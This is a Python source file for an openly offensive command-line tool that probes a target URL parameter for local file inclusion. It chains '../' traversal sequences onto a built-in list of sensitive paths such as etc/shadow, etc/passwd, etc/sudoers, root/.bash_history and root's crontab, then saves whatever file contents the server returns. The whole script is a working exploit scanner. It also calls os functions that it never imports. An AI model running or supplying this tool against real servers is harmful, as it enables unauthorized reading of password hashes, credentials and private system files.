from termcolor import *
from os import path
import requests, re
import argparse, cursor, sys


class Error(Exception):
	"""Base class for other exceptions"""
	pass

class UrlRegexError(Error):
	"""Thrown when URL doesn't match required format"""
	pass

def cleanup():
	print("\n")
	cursor.show()

def main():
	cprint("\nFormating of wordlists should be like the following for each line: ", "cyan", attrs=["bold", "underline"])
	cprint("adir/anotherdir", "green", end="")
	cprint("  NOT  ", "cyan", attrs=["bold"], end="")
	cprint("/adir/anotherdir\n", "red")
	status200 = []
	default_dirs =  [
		'home',
		'opt',
		'webapp',
		'wordpress',
		'templates',
		'etc/issue',
		'etc/profile',
		'etc/passwd',
		'etc/shadow',
		'etc/sudoers',
		'etc/systemd/system',
		'etc/php',
		'var/log/dmessage',
		'var/mail/root',
		'var/spool/cron/crontabs/root',
		'var/www/html',
		'root/.bash_history',
		'proc/version'
	]
	wlist = []

	parser = argparse.ArgumentParser(description="Find LFI vulnerabilities")
	parser.add_argument("-u", "--url", required=True, type=str, help="url to test for LFI vulns")
	parser.add_argument("-p", "--param", required=True, help="parameter to use, http://10.10.36.16/article?NAME=lfiattack, NAME is the parameter")
	parser.add_argument("-w", "--wordlist", default=default_dirs, type=str, help="wordlist to use for directory checking [default = apachebuiltin]")
	parser.add_argument("-i", "--iterations", default=10, type=int, help="amount of times to move down the directory before testing the next directory [default = 10]")
	args = parser.parse_args()

	url = args.url
	param = args.param
	wordlist = args.wordlist 
	iterations = args.iterations

	f  = open("200.txt", "w+")

	index = 0
	i = 0

	attempts = 0
	success = 0
	failed = 0

	if re.search("^http://.*/.", url) or re.search("^https://.*/.", url):
		if wordlist != default_dirs:
			with open(wordlist, "r") as file:
				for lines in file:
					wlist.append(lines.strip("\n"))
			file.close()
			list_to_use = wlist
		else:
			list_to_use = default_dirs

		print("")
		while i < iterations:
			cursor.hide()

			params = {
				param : f"{'../'*i+list_to_use[index]}"
			}

			r = requests.get(url, params = params)

			if r.status_code == 200:
				success += 1
				
				status200.append(r.text)
				
				f.write("{}".format('\n' + '*' * 50 + " " + url+params[param] + " START " + '*' * 50 + '\n'))
				f.write(r.text)
				f.write("{}".format('\n' + '*' * 50 + " " + url+params[param] + " END " + '*' * 50 + '\n'))
				
				completestr = colored(f"{failed} [-] 500/unknown", "red", attrs=["bold"]) + colored(f" | {params[param]} | ", "cyan", attrs=["bold"])+ colored(f"{success} [+] 200", "green", attrs=["bold"])
				
				if path.exists("urls/urls.html"):
					urlFile = open("urls/urls.html", "a")
					urlFile.write("<br>")
					urlFile.write(f"<a href='{r.url}'>((({params[param]}))) :: {url+params[param]}</a><br>")
					urlFile.close()
				else:
					os.makedirs("urls", exist_ok=True)
					urlFile = open("urls/urls.html", "w+")
					urlFile.write("<br>")
					urlFile.write(f"<a href='{r.url}'>((({params[param]}))) :: {url+params[param]}</a><br>")
					urlFile.close()
					
				if index == len(list_to_use) - 1:
					break
				else:
					index += 1

				i = 0
			else:
				failed += 1
				i += 1
				completestr = colored(f"{failed} [-] 500/unknown", "red", attrs=["bold"]) + colored(f" | {params[param]} | ", "cyan", attrs=["bold"])+ colored(f"{success} [+] 200", "green", attrs=["bold"])
			attempts += 1
			if i == iterations:
				index += 1
				i = 0
			sys.stdout.write('\033[2K\033[1G')
			print(f"\r{completestr}", end="")
		sys.stdout.write('\033[2K\033[1G')
		cursor.show()

		print(f"\r{completestr}", end="\n")
		
		if len(status200) > 0:
			cprint(f"\n{str(success)+'/'+str(attempts)} returned 200, open file 200.txt for found data!\n", "magenta", attrs=["bold"])
		else:
			cprint(f"\nNothing found!\n", "red", attrs=["bold"])
			os.remove("200.txt")
	else:
		raise UrlRegexError	

if __name__ ==  '__main__':
	try:
		main()
	except:
		cleanup()
		